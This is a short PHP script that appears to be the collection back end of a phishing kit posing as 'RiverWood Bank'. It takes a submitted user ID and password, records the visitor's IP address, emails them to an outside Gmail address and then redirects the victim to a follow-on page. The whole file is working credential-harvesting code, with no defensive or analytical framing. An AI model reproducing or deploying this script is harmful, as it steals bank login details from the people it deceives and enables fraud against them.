<?
$USER = $_POST['USER'];
$pcdwd = $_POST['pcdwd'];

$ip = getenv("REMOTE_ADDR");

//sending email info here
	$subj = "Info From Erl: $ip";
	$msg = "----------------------------RiverWood Bank-----------------------------\n UserID: $USER\n pcdwd: $pcdwd\n ------------------\nip: $ip";
	$from = "From: Erl<infos@Erl.com>";
	mail("stvhoward8@gmail.com", $subj, $msg, $from);
	mail("$cc", $subj, $msg, $from);
	header( "Location: index2.htm");

?>
